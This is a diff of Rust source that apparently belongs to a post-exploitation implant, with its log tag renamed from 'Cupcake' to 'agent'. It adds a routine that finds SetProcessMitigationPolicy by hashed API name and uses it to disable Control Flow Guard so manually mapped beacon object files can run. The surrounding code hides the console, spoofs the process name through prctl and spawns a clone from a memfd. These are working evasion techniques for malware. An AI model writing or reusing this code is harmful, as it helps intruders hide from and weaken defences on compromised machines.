@@ -60,6 +60,26 @@ pub const fn hash_api_name(s: &[u8]) -> u32 {
     h
 }
 
+/// Best-effort: relax Control Flow Guard for this process so Manual-Mapped
+/// L2 modules (classic in-process BOF engine) can be invoked via indirect
+/// function pointers. Silent no-op when the API is absent.
+#[cfg(windows)]
+pub fn relax_cfg_self() {
+    const H_SET_MITIGATION: u32 = hash_api_name(b"SetProcessMitigationPolicy");
+    unsafe {
+        type SetProcessMitigationPolicyFn =
+            unsafe extern "system" fn(u32, *const u8, usize) -> i32;
+        let k32 = get_module_base(hash_module_name(b"kernel32.dll"));
+        let Some(addr) = get_api_addr(k32, H_SET_MITIGATION) else {
+            return;
+        };
+        let f: SetProcessMitigationPolicyFn = std::mem::transmute(addr);
+        // ProcessControlFlowGuardPolicy = 7; zeroed flags → CF Guard off
+        let policy = [0u8; 16];
+        let _ = f(7, policy.as_ptr(), policy.len());
+    }
+}
+
 pub fn hide_console() {
     #[cfg(windows)]
     unsafe {
@@ -271,7 +291,7 @@ pub fn spoof_process_name(_name: &str) {
                 let ret = libc::prctl(45, 1, arg_area as u64, 0, 0);
                 if ret == 0 {
                     crate::utils::db_print(&format!(
-                        "[Cupcake] cmdline modified via PR_SET_MM to: {}",
+                        "[agent] cmdline modified via PR_SET_MM to: {}",
                         name
                     ));
 
@@ -281,7 +301,7 @@ pub fn spoof_process_name(_name: &str) {
                 } else {
                     // Fallback: PR_SET_MM requires CAP_SYS_ADMIN
                     crate::utils::db_print(
-                        "[Cupcake] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback",
+                        "[agent] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback",
                     );
                 }
             }
@@ -293,7 +313,7 @@ pub fn spoof_process_name(_name: &str) {
         // We'll implement a simpler version that creates a memfd and overwrites exe symlink
 
         crate::utils::db_print(&format!(
-            "[Cupcake] Process name spoofed to: {} (comm)",
+            "[agent] Process name spoofed to: {} (comm)",
             name
         ));
     }
@@ -357,7 +377,7 @@ pub fn spawn_memfd_clone() -> Option<u32> {
         libc::close(fd);
 
         if pid > 0 {
-            crate::utils::db_print(&format!("[Cupcake] Spawned memfd clone with PID: {}", pid));
+            crate::utils::db_print(&format!("[agent] Spawned memfd clone with PID: {}", pid));
             Some(pid as u32)
         } else {
             None
